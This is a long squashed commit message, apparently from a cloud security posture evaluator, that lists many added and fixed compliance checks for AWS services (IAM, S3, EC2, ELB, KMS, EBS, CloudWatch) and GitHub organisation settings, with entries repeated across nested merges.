Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Add tcp port 138 for netbios test\r\n\r\n* Add udp port 139 for netbios test\r\n\r\n* Add icmpv6 in icmp access test\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Add cloudwatch tester (#70)\r\n\r\n* Add cloudwatch tester\r\n\r\n* Add multiple check for alarms present in cloudwatch\r\n\r\n* Add more cloudwatch checks and one cloudformation check for stack notifications\r\n\r\n* Add small fix\r\n\r\n* Add item to results\r\n\r\n* removed unnecessary line\r\n\r\n* Add result object helper method\r\n\r\n* item name changed to cloudformation_stack name in unauthorized api calls not monitored\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* fix protodep.toml typo (#105)\r\n\r\n* Cloud Trail Tasks are added (#112)\r\n\r\n* SNS Tester task added. (#111)\r\n\r\n* Auto posture evaluator\/elasticbeanstalk antstack (#79)\r\n\r\n* Add application env should have elb access log enabled test\r\n\r\n* Fix small issue\r\n\r\n* Add enhanced health reporting enabled test\r\n\r\n* Fix enhanced health reporting check\r\n\r\n* Add only active env for enhanced health reporting enabled test\r\n\r\n* Add application env has managed updates enabled test\r\n\r\n* Add helper function to form return items\r\n\r\n* Add environemnt notification is configured test\r\n\r\n* Add helper method to get all the environments\r\n\r\n* Fix application loadbalancer has access logs test\r\n\r\n* Auto posture evaluator\/GitHub antstack (#53)\r\n\r\n* Add check for 2fa auth enforced\r\n\r\n* Add check for base permission not set to admin\r\n\r\n* Add check for members can not create public repo\r\n\r\n* Add check for organization's domain is not verified\r\n\r\n* Add check for github pages disabled\r\n\r\n* Add check for members without gpg keys\r\n\r\n* Add check for code security alerts enabled\r\n\r\n* Add no outside collaborators with admin permissions\r\n\r\n* Add check for pending invitations for outside collaborators\r\n\r\n* Replaced base url string with constants\r\n\r\n* Add check for deploy keys are fresh\r\n\r\n* Fix typo in method name\r\n\r\n* Add check for sso enabled\r\n\r\n* Add check for repositories monitored for vulnerabilities\r\n\r\n* Add check for outside collaborators don't have admin permissions\r\n\r\n* Add check for 3rd party apps with pull request write permissions\r\n\r\n* Remove redundant loop execution in GPG key check\r\n\r\n* Remove debug print function\r\n\r\n* Use site_admin for no outside collaborators with admin permission check\r\n\r\n* Add helper method for pagination\r\n\r\n* Add pagination in no outside collaborator admin check\r\n\r\n* Fix api string for better readability\r\n\r\n* Add pagination in github pages disabled test\r\n\r\n* Add pagination in memmers without gpg keys test\r\n\r\n* Add pagination in deploy key fresh check\r\n\r\n* Fix deploy keys fresh check\r\n\r\n* Add pagination in outside collaborator with admin\r\n\r\n* Fix third party apps with pull request write test\r\n\r\n* Add evidence repositories list public test\r\n\r\n* Fix pagination in members without gpg keys check\r\n\r\n* Fix outside collaborators with admin permission pagination\r\n\r\n* Add no vulnerabilities found repo test\r\n\r\n* Fix pending invitation with admin permission test\r\n\r\n* Fix all repo monitored for code scanning\r\n\r\n* Fix users without MFA\r\n\r\n* Fix default repo permissions NoneType issue\r\n\r\n* Use status code for users without MFA check\r\n\r\n* Modify get paginated to consider status code of response\r\n\r\n* Add status code in github pages disabled\r\n\r\n* Modify member without GPG keys for status code\r\n\r\n* Modify pending admin invitations to consder status code\r\n\r\n* Modify deploy key freshness check to consider status code\r\n\r\n* Modify all repo monitored for code vulnerabilities\r\n\r\n* Use status code in evidence repo is public\r\n\r\n* Modify vulnerabilities found on repo to consider status code\r\n\r\n* Add HTTP status code in no outside collaborator with admin test\r\n\r\n* Use HTTP status code in code security alerts are enabled test\r\n\r\n* Add HTTP 404 case for vulnerabilities fouund on repo test\r\n\r\n* Add HTTP 404 case in evidence repos are public\r\n\r\n* Add HTTP 404 case in sso enabled test\r\n\r\n* Add HTTP 404 case in deploy keys are fresh test\r\n\r\n* Add HTTP 404 case in repos monitored for code vulnerabilities test\r\n\r\n* Add HTTP 404 case in members without GPG keys test\r\n\r\n* Add HTTP 404 in github pages disabled test\r\n\r\n* Add HTTP 404 case in org domain not verified test case\r\n\r\n* Add HTTP 404 case in member can create public repo test\r\n\r\n* Add HTTP 404 case in base permission not admin test\r\n\r\n* Add HTTP 404 case 2fa auth enforced test case\r\n\r\n* Fix forable repositories test\r\n\r\n* Add HTTP 404 check too many admin user test\r\n\r\n* Fix third aprty app with write permissions test\r\n\r\n* Fix Deply keys are fresh result\r\n\r\n* Remove debug print function\r\n\r\n* Add small fix\r\n\r\n* Remove result item when there isn't any resource we are looking for\r\n\r\n* Remove not owner item from response\r\n\r\n* Remove unnecessary imports\r\n\r\n* Add personal access token validation\r\n\r\n* Add constant for max number of admin users\r\n\r\n* Fix pending invitations with admin permissions test\r\n\r\n* Remove the other status code check\r\n\r\n* Fix 2fa enforced test\r\n\r\n* Fix members can create publi repo test\r\n\r\n* Fix deploy keys are fresh test\r\n\r\n* Add get method to get is_verified\r\n\r\n* Remove forbidden@@<org> from outside collaborators with admin permission test\r\n\r\n* Remove unused variables\r\n\r\n* Cloudfront Tester Tasks added. (#110)\r\n\r\n* Prefix keyword 'aws' for all sns tester functions (#123)\r\n\r\n* Prefix 'aws' added for all ses tester functions (#121)\r\n\r\n* Elastic Cache Cluster Node check condition added (#122)\r\n\r\n* Prefix aws key word added for all tests (#120)\r\n\r\n* Prefix added for Cloudfront Tester functions. (#124)\r\n\r\n* Prefix added for SQS Tester functions. (#130)\r\n\r\n* Prefix added for route 53 tester functions. (#129)\r\n\r\n* Prefix added for Redshift Tester functions. (#128)\r\n\r\n* Prefix added for DMS Tester functions (#126)\r\n\r\n* Prefix added for all Cloudtrail functions (#125)\r\n\r\n* Prefix added for EBS Tester functions. (#127)\r\n\r\n* Auto posture evaluator\/s3 antstack (#117)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add or instead of and in block public access disabled test\r\n\r\n* Restriction check for topic,subscription and encryption functions are done (#63)\r\n\r\nElastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done\r\n\r\n* Elastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done (#58)\r\n\r\nElastic Search -  Not publicly accessible\r\n\r\n* SQS - Tester file added (#65)\r\n\r\n* SQS - Tester file added\r\n\r\n* Fixes in the Sqs testers\r\n\r\n* Auto posture evaluator\/elb antstack (#66)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* add grpc endpoint (#71)\r\n\r\n* add grpc endpoint\r\n\r\n* change execution_id\r\n\r\n* add model folder to the package_generator.sh\r\n\r\n* change the return value of logger method and chnge the README file\r\n\r\n* remove await\r\n\r\n* remove readme\r\n\r\n* Removing the coralogix (old) endpoint\r\n\r\n* Change raise exception to print an continue\r\n\r\n* delete package folder in the beginning\r\n\r\n* Remove exception in case the Result list is empty (#86)\r\n\r\n* Add neptune cluster tests (#82)\r\n\r\n* Add neptune cluster tests\r\n\r\n* Fix neptune cluster audit log issue\r\n\r\n* fix uuid - to generate uuid4() (#87)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#69)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#107)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#108)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Add tcp port 138 for netbios test\r\n\r\n* Add udp port 139 for netbios 